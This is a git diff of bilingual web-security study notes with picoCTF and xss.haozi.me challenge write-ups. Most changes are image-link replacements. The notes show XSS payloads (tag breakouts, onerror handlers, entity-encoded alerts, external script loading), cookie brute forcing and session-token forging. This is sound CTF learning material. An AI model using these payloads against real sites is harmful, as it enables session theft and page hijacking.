@@ -10,7 +10,7 @@
 
 查看网页源代码
 
-![image-20240420150805257](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240420150805257.png)
+![image-20240420150805257](https://s2.loli.net/2024/05/09/5k37efYVJGTWNi9.png)
 
 
 
@@ -20,23 +20,23 @@
 
 打开google 开发者模式 ，选中 top ，右键选择 " 在所有文件中搜索 " ，输入 picoCTF 得到flag 。
 
-![image-20240420151130418](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240420151130418.png)
+![image-20240420151130418](https://s2.loli.net/2024/05/09/quaWzj3dAP5w27X.png)
 
 
 
 or 将整个网站的文件下载到本地再用 grep 查询
 
-![image-20240422115208725](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240422115208725.png)
+![image-20240422115208725](https://s2.loli.net/2024/05/09/vf1VZxKL3cUIYJk.png)
 
 
 
 
 
-![image-20240422120928485](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240422120928485.png)
+![image-20240422120928485](https://s2.loli.net/2024/05/09/KdxorvT5Ve97LUc.png)
 
 
 
-![image-20240422120648121](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240422120648121.png)
+![image-20240422120648121](https://s2.loli.net/2024/05/09/BIoEQl7iUCuHvNL.png)
 
 
 
@@ -102,7 +102,7 @@ https://play.picoctf.org/practice/challenge/200?originalEvent=67&page=1&search=l
 
 ### picobrowser
 
-![image-20240425115652082](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240425115652082.png)
+![image-20240425115652082](https://s2.loli.net/2024/05/09/25JelDoQVNAdRSL.png)
 
 
 
@@ -127,7 +127,7 @@ https://play.picoctf.org/practice/challenge/200?originalEvent=67&page=1&search=l
 
 ### Cookies
 
-![image-20240428115821718](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428115821718.png)
+![image-20240428115821718](https://s2.loli.net/2024/05/09/qtFcuso6RA7LpgY.png)
 
 
 
@@ -137,19 +137,19 @@ https://play.picoctf.org/practice/challenge/200?originalEvent=67&page=1&search=l
 
 - 初始状态， cookie header 还未设置， 可以看到 服务器端的 response header 设置 Set-Cookie `<cookie_name> = <cookie_value>` 
 
-![image-20240428202600050](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202600050.png)
+![image-20240428202600050](https://s2.loli.net/2024/05/09/7mZLVjorf9pJaCE.png)
 
 
 
 - browser 收到服务器端的 set-cookie header， 设置自己的 cookie 并发送 GET 请求
 
-![image-20240428202724617](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202724617.png)
+![image-20240428202724617](https://s2.loli.net/2024/05/09/sU9mhEIpkGQdXYg.png)
 
 
 
 - 输入提示内容，发起 POST 请求 ，服务器端返回新的 cookie值
 
-![image-20240428202517662](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202517662.png)
+![image-20240428202517662](https://s2.loli.net/2024/05/09/4C2hrWfKNG35YTl.png)
 
 And the browser will be redirected to another page PATH /check
 
@@ -157,7 +157,7 @@ And the browser will be redirected to another page PATH /check
 
 - 根据收到的新 cookie值 ， 重新发起  GET 请求
 
-![image-20240428202833477](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202833477.png)
+![image-20240428202833477](https://s2.loli.net/2024/05/09/k8TvHBDP9xUXG46.png)
 
 
 
@@ -167,25 +167,25 @@ And the browser will be redirected to another page PATH /check
 
 **设置 Payload type 为 Numbers**
 
-![image-20240428204523055](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428204523055.png)
+![image-20240428204523055](https://s2.loli.net/2024/05/09/8keW9fjwu2iOrBy.png)
 
 
 
 通过 settings->Grep-Match 过滤输出，( 需要注意的是 {} 需要转义 )
 
-![image-20240428202227275](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202227275.png)
+![image-20240428202227275](https://s2.loli.net/2024/05/09/uYKT9ex6WLdi3o5.png)
 
 
 
 **result**
 
-![image-20240428204759863](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428204759863.png)
+![image-20240428204759863](https://s2.loli.net/2024/05/09/ztsRh3Yjo5FgMTE.png)
 
 
 
 
 
-![image-20240428204910387](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428204910387.png)
+![image-20240428204910387](https://s2.loli.net/2024/05/09/ZuAvCyL5Qne2a3b.png)
 
 
 
@@ -302,41 +302,9 @@ for cookie_char_pos in range(len(original_cookie)):
 
 
 
-![image-20240501223533656](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240501223533656.png)
+![image-20240501223533656](https://s2.loli.net/2024/05/09/D96ymhkcYqKjw3g.png)
 
 
-
-#### base64 module
-
-This module provides functions for encoding binary data to printable ASCII characters and decoding such encodings back to binary data. It provides encoding and decoding functions for the encodings specified in [**RFC 4648**](https://datatracker.ietf.org/doc/html/rfc4648.html), which defines the Base16, Base32, and Base64 algorithms
-
-
-
-There are two interfaces provided by this module. The modern interface supports encoding [bytes-like objects](https://docs.python.org/3/glossary.html#term-bytes-like-object) to ASCII [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes), and decoding [bytes-like objects](https://docs.python.org/3/glossary.html#term-bytes-like-object) or strings containing ASCII to [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes)
-
-
-
-**`bytes-like object`**
-
-An object that supports the [Buffer Protocol](https://docs.python.org/3/c-api/buffer.html#bufferobjects) and can export a C-[contiguous](https://docs.python.org/3/glossary.html#term-contiguous) buffer. This includes all [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes), [`bytearray`](https://docs.python.org/3/library/stdtypes.html#bytearray), and [`array.array`](https://docs.python.org/3/library/array.html#array.array) objects, as well as many common [`memoryview`](https://docs.python.org/3/library/stdtypes.html#memoryview) objects. Bytes-like objects can be used for various operations that work with binary data; these include compression, saving to a binary file, and sending over a socket.
-
-
-
-
-
-**`base64.base64encode(s, altchars=None)`**
-
-Encode the [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object) *s* using Base64 and return the encoded [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes).
-
-Optional *altchars* must be a [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object) of length 2 which specifies an alternative alphabet for the `+` and `/` characters. This allows an application to e.g. generate URL or filesystem safe Base64 strings. The default is `None`, for which the standard Base64 alphabet is used.
-
-
-
-
-
-**`base64.b64decode(s, altchars=None, validate=False)`**
-
-Decode the Base64 encoded bytes-like object or ASCII string *s* and return the decoded bytes
 
 
 
@@ -487,13 +455,13 @@ if __name__ == '__main__':
 
 https://stackoverflow.com/questions/19623267/importerror-no-module-named-crypto-cipher
 
-![image-20240430201121756](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240430201121756.png)
+![image-20240430201121756](https://s2.loli.net/2024/05/09/pNljozFPgrHRSTL.png)
 
 
 
-![image-20240501092707366](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240501092707366.png)
+![image-20240501092707366](https://s2.loli.net/2024/05/09/fU81OkHVSeMRyGg.png)
 
-![image-20240501101128048](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240501101128048.png)
+![image-20240501101128048](https://s2.loli.net/2024/05/09/rktSjuAH3Cfcmp9.png)
 
 the block length is 16 , so 7 bytes will be padded.
 
@@ -636,13 +604,13 @@ if __name__ == "__main__":
 
 #### Analyses
 
-![image-20240502162729476](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162729476.png)
+![image-20240502162729476](https://s2.loli.net/2024/05/09/zObTRUka7mCNh8v.png)
 
 `Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZjNN3Q.lqfJRkuoI7Ft-lLLZ36o2T_49v0; HttpOnly; Path=/`
 
 
 
-![image-20240502162826226](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162826226.png)
+![image-20240502162826226](https://s2.loli.net/2024/05/09/7cpfIxs8K164BPr.png)
 
 
 
@@ -650,13 +618,13 @@ if __name__ == "__main__":
 
 
 
-![image-20240502162858473](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162858473.png)
+![image-20240502162858473](https://s2.loli.net/2024/05/09/iYzRDIVMCAugqKv.png)
 
 `Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZjNOCw.qVeZgYMaE2Wox_sEyFvfezvZrz8; HttpOnly; Path=/`
 
 
 
-![image-20240502162923501](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162923501.png)
+![image-20240502162923501](https://s2.loli.net/2024/05/09/N6RLHGhY2oUSEaP.png)
 
 `Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZjNODA.V6DStg3v2e5BZ5ZpVnkalZNDLUs; HttpOnly; Path=/`
 
@@ -664,7 +632,7 @@ if __name__ == "__main__":
 
 由session中的 `.` 联想到 JWT 结构
 
-![image-20240502193317048](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502193317048.png)
+![image-20240502193317048](https://s2.loli.net/2024/05/09/TSFDHBv9bohCA61.png)
 
 So the target is to change the `very_auth` and accordingly, change the signature since the secret_key is known( brute force )
 
@@ -684,15 +652,15 @@ https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe
 
 
 
-![image-20240502200254243](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502200254243.png)
+![image-20240502200254243](https://s2.loli.net/2024/05/09/obe2W8XOkqzPtxC.png)
 
-![image-20240502201339028](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502201339028.png)
+![image-20240502201339028](https://s2.loli.net/2024/05/09/BYPD2MQ1Vh6qxjJ.png)
 
-![image-20240502201321269](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502201321269.png)
+![image-20240502201321269](https://s2.loli.net/2024/05/09/BFyMNQCqOK3lD5V.png)
 
-![image-20240503204416467](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240503204416467.png)
+![image-20240503204416467](https://s2.loli.net/2024/05/09/cWUuq9Si7vVnDRw.png)
 
-![image-20240502202757928](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502202757928.png)
+![image-20240502202757928](https://s2.loli.net/2024/05/09/BtqvVipEhx59gMw.png)
 
 
 
@@ -822,7 +790,7 @@ JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api
 
   Encode bytes-like objects using the URL- and filesystem-safe alphabet, which substitutes `-` instead of `+` and `_` instead of `/` in the standard Base64 alphabet, and return the encoded bytes. The result can still contain` =`.
 
-![image-20240502193128066](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502193128066.png)
+![image-20240502193128066](https://s2.loli.net/2024/05/09/54nASwIaFO1CygR.png)
 
 3 `=` is always a safe padding.
 
@@ -934,7 +902,7 @@ And the last template is `lose.html`:
 
 js obfusacation
 
-![image-20240504142110129](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504142110129.png)
+![image-20240504142110129](https://s2.loli.net/2024/05/09/YeWONwMVS3Qkyjl.png)
 
 picoCTF{not_this_again_50a029}
 
@@ -1000,9 +968,9 @@ ROT13 (Rotate13) is a simple letter substitution cipher that replaces a letter w
 
 Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13 is its own inverse; that is, to undo ROT13, the same algorithm is applied, so the same action can be used for encoding and decoding. The algorithm provides virtually no cryptographic security, and is often cited as a canonical example of weak encryption.
 
-![image-20240504151833679](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504151833679.png)
+![image-20240504151833679](https://s2.loli.net/2024/05/09/7p3DUxLf5VdvPJa.png)
 
-![image-20240504151812374](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504151812374.png)
+![image-20240504151812374](https://s2.loli.net/2024/05/09/6OI8d2z43ahqyxs.png)
 
 
 
@@ -1044,19 +1012,19 @@ Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13 is its o
 
 #### 方法一： python 脚本
 
-![image-20240504113140848](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504113140848.png)
+![image-20240504113140848](https://s2.loli.net/2024/05/09/GMwKBalbXi1yost.png)
 
-![image-20240504113158854](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504113158854.png)
+![image-20240504113158854](https://s2.loli.net/2024/05/09/CmWkMYraxtFb2n7.png)
 
 
 
 #### 方法二 ：burpsuite
 
-![image-20240504114333952](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114333952.png)
+![image-20240504114333952](https://s2.loli.net/2024/05/09/OWQ68JR4YBpDXwq.png)
 
-![image-20240504114234643](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114234643.png)
+![image-20240504114234643](https://s2.loli.net/2024/05/09/ha4ycO8SV329Wqi.png)
 
-![image-20240504114303419](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114303419.png)
+![image-20240504114303419](https://s2.loli.net/2024/05/09/lk93UwBcWiPbJ4C.png)
 
 
 
@@ -1086,9 +1054,9 @@ xss platform 网址 ：https://xssaq.com/
 
 
 
-![image-20240505151746029](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505151746029.png)
+![image-20240505151746029](https://s2.loli.net/2024/05/09/HQAiIRYEDOVwo2m.png)
 
-![image-20240505151306027](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505151306027.png)
+![image-20240505151306027](https://s2.loli.net/2024/05/09/XBw97FvyCejRWau.png)
 
 
 
@@ -1107,9 +1075,9 @@ xss platform 网址 ：https://xssaq.com/
 - HTML实体编码： `&nbsp;` , `&#32;`
 - URL编码：`%20`
 - Unicode编码：`\u0020`
-- ![image-20240505161152530](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505161152530.png)
+- ![image-20240505161152530](https://s2.loli.net/2024/05/09/QRJ7FMiryeqBpWo.png)
 
-![image-20240505160546070](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505160546070.png)
+![image-20240505160546070](https://s2.loli.net/2024/05/09/KSLXJkd8WAolmwj.png)
 
 
 
@@ -1121,15 +1089,15 @@ xss platform 网址 ：https://xssaq.com/
 
 尝试 `<script>alert(1)</script>`
 
-![image-20240505164644699](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164644699.png)
+![image-20240505164644699](https://s2.loli.net/2024/05/09/5UneSlA2DZLw8jz.png)
 
  将 s 改为 S 成功。
 
 
 
-![image-20240505164906653](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164906653.png)
+![image-20240505164906653](https://s2.loli.net/2024/05/09/6dGNHpBqCenxZsJ.png)
 
-![image-20240505164854180](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164854180.png)
+![image-20240505164854180](https://s2.loli.net/2024/05/09/GgAVok6CURnBMXY.png)
 
 
 
@@ -1145,7 +1113,7 @@ xss platform 网址 ：https://xssaq.com/
 
 首先 post 恶意代码到server端
 
-![image-20240505163952400](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505163952400.png)
+![image-20240505163952400](https://s2.loli.net/2024/05/09/Y7spMdqFakE1O3e.png)
 
 
 
@@ -1155,11 +1123,11 @@ xss platform 网址 ：https://xssaq.com/
 
 然后bot模拟用户点击行为，访问此网站，加载恶意代码。
 
-![image-20240505164144914](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164144914.png)
+![image-20240505164144914](https://s2.loli.net/2024/05/09/9ou3GOelJRstVax.png)
 
 
 
-![image-20240505164315090](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164315090.png)
+![image-20240505164315090](https://s2.loli.net/2024/05/09/PSTADJhsdiftjzV.png)
 
 
 
@@ -1169,15 +1137,15 @@ xss platform 网址 ：https://xssaq.com/
 
 #### DOM 反射
 
-![image-20240505184508085](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505184508085.png)
+![image-20240505184508085](https://s2.loli.net/2024/05/09/ulVJOq5AoUmfIXz.png)
 
 
 
-![image-20240505185654461](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185654461.png)
+![image-20240505185654461](https://s2.loli.net/2024/05/09/cbL3xgnDeVEiUZa.png)
 
-![image-20240505185957173](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185957173.png)
+![image-20240505185957173](https://s2.loli.net/2024/05/09/ARzsQ7jiVIp4J5P.png)
 
-![image-20240505185938760](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185938760.png)
+![image-20240505185938760](https://s2.loli.net/2024/05/09/RglybX8BsmKdIjU.png)
 
 
 
@@ -1189,7 +1157,7 @@ xss platform 网址 ：https://xssaq.com/
 
 https://blog.csdn.net/weixin_49125123/article/details/131546660
 
-![image-20240505190537307](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505190537307.png)
+![image-20240505190537307](https://s2.loli.net/2024/05/09/QC2DTY1c53Z4i7v.png)
 
 `location.search`获取查询字符串部分 ， split方法将字符串拆分为参数名和参数值的数组。
 
@@ -1203,9 +1171,9 @@ example :
 
 
 
-![image-20240505192740432](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505192740432.png)
+![image-20240505192740432](https://s2.loli.net/2024/05/09/TJoVmnuIM58x2LE.png)
 
-![image-20240505192705892](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505192705892.png)
+![image-20240505192705892](https://s2.loli.net/2024/05/09/CGQt5qDaYLvhkM2.png)
 
 
 
@@ -1229,7 +1197,7 @@ two types of messages: requests and responses
 
 Web developers rarely craft these textual HTTP messages themselves: software, a Web browser, proxy, or Web server, perform this action. They provide HTTP messages through config files (for proxies or servers), APIs (for browsers), or other interfaces.
 
-![image-20240503214006944](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240503214006944.png)
+![image-20240503214006944](https://s2.loli.net/2024/05/09/XxtZ7hkRO4JYoqN.png)
 
 HTTP/1.x messages have a few drawbacks for performance:
 
@@ -1502,7 +1470,7 @@ pass the session IDs as **a parameter in URLs or store them in the cookies**.
 
 **How Do Web Sessions Work**
 
-![image-20240502094209124](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502094209124.png)
+![image-20240502094209124](https://s2.loli.net/2024/05/09/tWxCJBpNMQoG8j9.png)
 
 
 
@@ -1532,27 +1500,25 @@ HTTP Basic authentication (BA) implementation is the simplest technique for enfo
 
 #### framework
 
-[RFC 7235](https://datatracker.ietf.org/doc/html/rfc7235) defines the HTTP authentication framework, which can be used by a server to [challenge](https://developer.mozilla.org/en-US/docs/Glossary/Challenge) a client request, and by a client to provide authentication information.
+[RFC 7235](https://datatracker.ietf.org/doc/html/rfc7235) defines the HTTP authentication framework
 
 1. The server responds to a client with a [`401`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) (Unauthorized) response status and provides information on how to authorize with a [`WWW-Authenticate`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) response header containing at least one challenge.
 2. A client that wants to authenticate include an [`Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) request header with credentials.
-3. Usually a client will present a password prompt to the user and will then issue the request including the correct `Authorization` header.
+3. Usually client will present a password prompt to the user and then issue(发出) the request including the correct `Authorization` header.
 
 ![A sequence diagram illustrating HTTP messages between a client and a server lifeline.](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication/http-auth-sequence-diagram.png)
 
-**Warning:** The "Basic" authentication scheme used in the diagram above sends the credentials encoded but not encrypted. This would be completely insecure unless the exchange was over a secure connection (HTTPS/TLS).
+**Warning:** The "Basic" authentication scheme used above sends the credentials encoded but not encrypted. This would be completely insecure unless the exchange was over a secure connection (HTTPS/TLS).
 
 
 
-If a (proxy) server receives valid credentials that are *inadequate* to access a given resource, the server should respond with the [`403`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403) `Forbidden` status code. Unlike [`401`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) `Unauthorized` or [`407`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/407) `Proxy Authentication Required`, authentication is impossible for this user and browsers will not propose a new attempt.
+If a (proxy) server receives valid credentials that are *inadequate(不足)* to access given resource, the server should respond with the **403 Forbidden** status code. Unlike **401 Unauthorized** or **407 Proxy Authentication Required,** authentication is impossible for this user and browsers will not propose a new attempt.
 
-In all cases, the server may prefer returning a [`404`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/404) `Not Found` status code, to hide the existence of the page to a user without adequate privileges or not correctly authenticated.
+In all cases, the server may prefer returning a **404 Not Found** status code, to hide the existence of the page to a user without adequate privileges
 
 
 
 ### protocol
-
-
 
 
 
@@ -1620,6 +1586,63 @@ The **`Authorization`** header is usually, but not always, sent after the user a
   field's value :  Base64 encoding of *`Aladdin:open sesame`*, *QWxhZGRpbjpvcGVuIHNlc2FtZQ==*. 
 
    *Authorization* header field  :`Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==`
+
+
+
+## URL
+
+**HTML Uniform Resource Locators**
+
+A URL is another word for a web address.
+
+A URL can be composed of words (e.g. w3schools.com), or an Internet Protocol (IP) address (e.g. 192.68.20.50).
+
+Most people enter the name when surfing, because names are easier to remember than numbers.
+
+
+
+### syntax rules
+
+`scheme://prefix.domain:port/path/filename`
+
+- **scheme** - defines the type of Internet service (most common is http or https)
+- **prefix** - defines a domain prefix (default for http is **www**)
+- **domain** - defines the Internet **domain name** (like w3schools.com)
+- **port** - defines the port number at the host (default for http is **80**)
+- **path** - defines a **path** at the server (If omitted: the root directory of the site)
+- **filename** - defines the name of a document or resource
+
+
+
+#### schemes
+
+| Scheme | Short for                          | Used for                        |
+| :----- | :--------------------------------- | :------------------------------ |
+| http   | HyperText Transfer Protocol        | Common web pages. Not encrypted |
+| https  | Secure HyperText Transfer Protocol | Secure web pages. Encrypted     |
+| ftp    | File Transfer Protocol             | Downloading or uploading files  |
+| file   |                                    | A file on your computer         |
+
+
+
+### URL Encoding
+
+*URLs can only be sent over the Internet using the ASCII character-set.*
+
+ If a URL contains characters outside the ASCII set, the URL has to be converted.
+
+- URL encoding replaces **non-ASCII characters with  "%" followed by hexadecimal digits**.
+- URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign, or %20.
+
+
+
+#### ASCII Encoding Reference
+
+https://www.w3schools.com/tags/ref_urlencode.ASP
+
+Your browser will encode input, according to the character-set used in your page.
+
+The default character-set in HTML5 is UTF-8.
 
 
 
@@ -1730,7 +1753,7 @@ https://portswigger.net/web-security/authentication/password-based/lab-username-
 
 #### **example :**
 
-![image-20240428161015073](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428161015073.png)
+![image-20240428161015073](https://s2.loli.net/2024/05/09/VgKSQqofChlnRL9.png)
 
 
 
@@ -1837,9 +1860,9 @@ content ...
 
 4. use intruder
 
-   ![image-20240428163701471](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428163701471.png)
+   ![image-20240428163701471](https://s2.loli.net/2024/05/09/VoWBibr3OIcdZ7x.png)
 
-![image-20240428170759962](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428170759962.png)
+![image-20240428170759962](https://s2.loli.net/2024/05/09/qNJYUsyO5jvRrFg.png)
 
 
 
@@ -2186,7 +2209,7 @@ The attacker can insert a fake login form into the page using DOM manipulation, 
 
 当解析到`<img>`标签时，浏览器会立即发起图像资源的请求，并开始下载图像。下载过程是异步进行的，即浏览器会继续解析和渲染HTML内容，而不会等待图像下载完成。
 
-![image-20240506160116254](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506160116254.png)
+![image-20240506160116254](https://s2.loli.net/2024/05/09/XZzFWs2RgC8PDxy.png)
 
 
 
@@ -2220,7 +2243,7 @@ The attacker can insert a fake login form into the page using DOM manipulation, 
 
 在遇到CSS代码时，浏览器不会像JavaScript代码一样去停止HTML标记的解析，相反它会继续进行HTML代码的解析，并且将CSS代码交给CSS引擎来进行处理。
 
-![image-20240506161430159](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506161430159.png)
+![image-20240506161430159](https://s2.loli.net/2024/05/09/c6y2DraGhMqtUYO.png)
 
 
 
@@ -2228,7 +2251,7 @@ The attacker can insert a fake login form into the page using DOM manipulation, 
 
 Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise( 破坏 ) their interaction with the application.
 
-![image-20240504183834667](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504183834667.png)
+![image-20240504183834667](https://s2.loli.net/2024/05/09/NL2Z5qUEYxMaGkR.png)
 
 In general, an XSS attack involves three actors: **the website**, **the victim**, and **the attacker**.
 
@@ -2788,7 +2811,7 @@ The use of backticks in JavaScript is for template literals. Template literals a
 
 ### 00
 
-![image-20240505194515271](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505194515271.png)
+![image-20240505194515271](https://s2.loli.net/2024/05/09/yPKnTSDEw9hU7qb.png)
 
 payload : `<script>alert(1)</script>`
 
@@ -2832,7 +2855,7 @@ features :
 
 #### Solve
 
-![image-20240505195702184](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505195702184.png)
+![image-20240505195702184](https://s2.loli.net/2024/05/09/gCxoY92WGbnj1eN.png)
 
 payload = `</textarea><script>alert(1)</script>`
 
@@ -2842,7 +2865,7 @@ payload = `</textarea><script>alert(1)</script>`
 
 ### 02 闭合
 
-![image-20240505200032916](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505200032916.png)
+![image-20240505200032916](https://s2.loli.net/2024/05/09/VeD42Azl1LBcNFR.png)
 
 payload = `"><script>alert(1)</script>`
 
@@ -2852,7 +2875,7 @@ payload = `"><script>alert(1)</script>`
 
 ### 03 `
 
-![image-20240505220339316](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505220339316.png)
+![image-20240505220339316](https://s2.loli.net/2024/05/09/KvemgfjRAk4J5Nd.png)
 
 正则 `/[()]/g` 意义 ：
 
@@ -2896,7 +2919,7 @@ So, when these HTML entities are rendered in a web browser, they will be interpr
 
 ### 04 html entities
 
-![image-20240506154159276](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506154159276.png)
+![image-20240506154159276](https://s2.loli.net/2024/05/09/8N9J7YXW3ucBhCA.png)
 
 payload = `<img src="" onerror=alert&#x28;&#x31;&#x29;>`
 
@@ -2919,7 +2942,7 @@ HTML注释支持以下两种方式：
 - `<!-- xxx -->`
 - `<!- xxx -!>` 
 
-![image-20240506162755606](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506162755606.png)
+![image-20240506162755606](https://s2.loli.net/2024/05/09/GCSIhzF5OtNad4n.png)
 
 payload = `--!><script>alert(1)</script>`
 
@@ -2987,7 +3010,7 @@ onmousemove
 =alert(1)
 ```
 
-![image-20240506172147134](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506172147134.png)
+![image-20240506172147134](https://s2.loli.net/2024/05/09/YzqXygIiTKJbaER.png)
 
 
 
@@ -3000,7 +3023,7 @@ type="image" src="" onerror
 =alert(1)
 ```
 
-![image-20240506172128952](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506172128952.png)
+![image-20240506172128952](https://s2.loli.net/2024/05/09/LJSdMtfeuPvAocz.png)
 
 
 
@@ -3038,7 +3061,7 @@ HTML has a certain level of fault tolerance or error recovery mechanisms built i
 
 #### solve
 
-![image-20240506184222745](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506184222745.png)
+![image-20240506184222745](https://s2.loli.net/2024/05/09/MlAf7SgtWsPYGR1.png)
 
 payload = `<img src='' onerror=alert(1) ` 末尾加空格或换行或 `//`
 
@@ -3055,7 +3078,7 @@ However, `< /style>` introduces a space between the `<` and `/` characters, whic
 
 
 
-![image-20240506185225979](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506185225979.png)
+![image-20240506185225979](https://s2.loli.net/2024/05/09/3NGZA2ctCn9xWXg.png)
 
 payload = `</style ><script>alert(1)</script>` 或加上换行
 
@@ -3080,7 +3103,7 @@ function render (input) {
 - `^`:  asserts the start of the line.
 - `https?`: This part matches the string "http" optionally followed by an "s". So, it matches both "http" and "https".
 
-![image-20240506192307210](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506192307210.png)
+![image-20240506192307210](https://s2.loli.net/2024/05/09/eRQkwIGnAMoi6vp.png)
 
 闭合双引号和 `</script>` , 
 
@@ -3092,9 +3115,9 @@ payload = `https://www.segmentfault.com"> </script> <img src= '' onerror=alert(1
 
 调用外部 js  
 
-![image-20240506193100822](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506193100822.png)
+![image-20240506193100822](https://s2.loli.net/2024/05/09/mtd9xwi4kpbBRzl.png)
 
-![image-20240506193357222](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506193357222.png)
+![image-20240506193357222](https://s2.loli.net/2024/05/09/zPZcXUDsQfdObIy.png)
 
 payload = `https://www.segmentfault.com.haozi.me/j.js `
 
@@ -3119,7 +3142,7 @@ https://www.segmentfault.com@xss.haozi.me/j.js
 
 也就是说，不能直接构造js代码执行了，但这里可以利用script标签加载 j.js，因为URL地址不受大小写影响且HTML标签不受大小写影响：
 
-![image-20240506202501327](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506202501327.png)
